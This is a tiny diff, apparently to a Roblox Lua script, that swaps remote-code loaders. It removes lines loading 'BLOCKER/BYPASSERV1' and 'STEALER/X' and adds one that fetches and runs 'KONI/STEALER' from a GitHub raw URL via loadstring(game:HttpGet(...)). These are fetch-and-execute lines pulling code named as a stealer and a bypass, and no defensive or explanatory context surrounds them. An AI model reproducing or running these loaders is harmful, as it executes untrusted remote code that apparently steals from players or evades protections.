@@ -1,2 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptsz99/BLOCKER/refs/heads/main/BYPASSERV1"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptsz99/STEALER/refs/heads/main/X"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptsz99/KONI/refs/heads/main/STEALER"))()
